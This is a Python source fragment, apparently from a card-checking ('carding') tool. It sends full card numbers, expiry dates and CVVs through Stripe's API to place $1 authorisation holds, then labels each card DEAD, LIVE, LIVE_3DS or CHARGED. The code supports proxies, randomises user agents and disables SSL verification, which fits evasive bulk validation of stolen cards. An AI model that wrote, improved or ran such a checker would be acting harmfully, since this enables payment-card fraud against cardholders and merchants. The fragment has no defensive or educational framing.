    "incorrect_number":       ("DEAD", "incorrect_number"),
    "generic_decline":        ("DEAD", "generic_decline"),
    "invalid_expiry_month":   ("DEAD", "invalid_expiry_month"),
    "invalid_expiry_year":    ("DEAD", "invalid_expiry_year"),
    "invalid_cvc":            ("DEAD", "incorrect_cvc"),
}


def _classify_stripe_error(body: dict) -> tuple[str, str]:
    """Classify a Stripe API error response."""
    err = body.get("error", {})
    code = err.get("decline_code") or err.get("code") or err.get("type", "")
    code_lower = str(code).lower()

    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in code_lower:
            return status, msg

    message = str(err.get("message", "")).lower()
    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in message:
            return status, msg

    if code:
        return "DEAD", code
    return "DEAD", "unknown_decline"


async def stripe_check(
    card: Card,
    proxy: Optional[str] = None,
    timeout: int = 15,
    secret_key: str = "",
) -> CheckResult:
    """Run a $1 auth check via Stripe secret key."""
    if not secret_key:
        return CheckResult(
            status="DEAD", message="stripe_not_configured",
            gateway="Stripe", price=1.0,
            store="stripe-api", card=card,
        )

    conn_timeout = aiohttp.ClientTimeout(total=timeout)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, resolver=ThreadedResolver())
    session_kwargs = {"timeout": conn_timeout, "connector": connector}

    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with aiohttp.ClientSession(**session_kwargs) as session:
            pm_result = await _stripe_create_pm(session, card, secret_key)
            if not pm_result["ok"]:
                status, msg = _classify_stripe_error(pm_result["body"])
                return CheckResult(
                    status=status, message=msg,
                    gateway="Stripe", price=1.0,
                    store="stripe-api", card=card,
                )

            pm_id = pm_result["pm_id"]
            pi_result = await _stripe_confirm_intent(session, pm_id, secret_key)
            body = pi_result["body"]

            if pi_result["status"] == 200:
                pi_status = body.get("status", "")
                if pi_status == "succeeded":
                    return CheckResult("CHARGED", "succeeded", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "requires_action":
                    return CheckResult("LIVE_3DS", "3ds_required", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "requires_payment_method":
                    return CheckResult("LIVE", "requires_payment_method", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "processing":
                    return CheckResult("LIVE", "processing", "Stripe", 1.0, "stripe-api", card)
                else:
                    s, m = _classify_stripe_error(body)
                    return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)
            else:
                s, m = _classify_stripe_error(body)
                return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)

    except Exception as e:
        logger.warning("Stripe check error: %s", e)
        return CheckResult("DEAD", f"error: {e}", "Stripe", 1.0, "stripe-api", card)


async def _stripe_create_pm(session: aiohttp.ClientSession, card: Card, secret_key: str) -> dict:
    """Create a Stripe payment method from card details using secret key."""
    ua = _rand_ua()
    headers = {
        "User-Agent": ua,
        "Authorization": f"Bearer {secret_key}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "type": "card",
        "card[number]": card.number,
        "card[exp_month]": card.month,
        "card[exp_year]": card.year,
        "card[cvc]": card.cvv,
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=data,
            headers=headers,
        ) as resp:
            body = await resp.json()
            if resp.status == 200 and "id" in body:
                return {"ok": True, "pm_id": body["id"], "body": body}
            return {"ok": False, "pm_id": None, "body": body}
    except Exception as e:
        return {"ok": False, "pm_id": None, "body": {"error": {"message": str(e)}}}


async def _stripe_confirm_intent(session: aiohttp.ClientSession, pm_id: str, secret_key: str) -> dict:
    """Create + confirm a $1 PaymentIntent using secret key."""
    ua = _rand_ua()
    headers = {
        "User-Agent": ua,
        "Authorization": f"Bearer {secret_key}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_intents",
            data={
                "amount": "100",
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": "true",
                "capture_method": "manual",
            },
            headers=headers,
        ) as resp:
            body = await resp.json()
            return {"status": resp.status, "body": body}
    except Exception as e:
        return {"status": 0, "body": {"error": {"message": str(e)}}}